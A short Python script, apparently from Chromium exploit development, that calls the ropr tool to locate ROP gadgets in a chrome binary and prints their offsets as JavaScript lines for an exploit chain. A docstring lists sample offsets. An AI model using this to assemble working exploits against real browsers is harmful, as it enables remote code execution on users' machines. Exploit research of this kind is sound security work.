#!/usr/bin/env python3

import subprocess

"""
pop4 = base + 0x0d4dbba4; //pop 12; pop r13; pop r14; pop r15; ret;
xchg_rsp_rax = base + 0x064e3000; // xchg rsp, rax; ret;
pop_rax = base + 0x03d878d4; // pop rax; ret;
pop_rsi = base + 0x0a2defa7; // pop rsi; ret;
pop_rdx = base + 0x0bc5a2e2; // pop rdx; ret; 
pop_rdi = base + 0x0d4dbbab; // pop rdi; ret; 
syscall_ret = base + 0x094b8077; // syscall; ret;
jmp_rax = base + 0x0d4dac9d; // jmp rax;
"""

BIN = "./chromium/chrome"

out = ""

def find_rop(name, gadget, inst_num):
    global out
    # https://github.com/Ben-Lichtman/ropr
    # ropr -c false ./chrome -m 2 -R "pop rax; ret;"
    cmd = f"ropr -c false {BIN} -m {inst_num} -R \"{gadget}\" | head -1"
    print(f"Finding {gadget} ...")
    res = subprocess.check_output(cmd, shell=True)
    addr = res.strip().split(b":")[0].decode()
    out += f"{name} = base + {addr}; // {gadget}\n"

find_rop("pop4", "pop r12; pop r13; pop r14; pop r15; ret;", 5)
find_rop("xchg_rsp_rax", "xchg rsp, rax; ret;", 2)
find_rop("pop_rax", "pop rax; ret;", 2)
find_rop("pop_rsi", "pop rsi; ret;", 2)
find_rop("pop_rdx", "pop rdx; ret;", 2)
find_rop("pop_rdi", "pop rdi; ret;", 2)
find_rop("syscall_ret", "syscall; ret;", 2)
find_rop("jmp_rax", "jmp rax;", 1)
print(out)
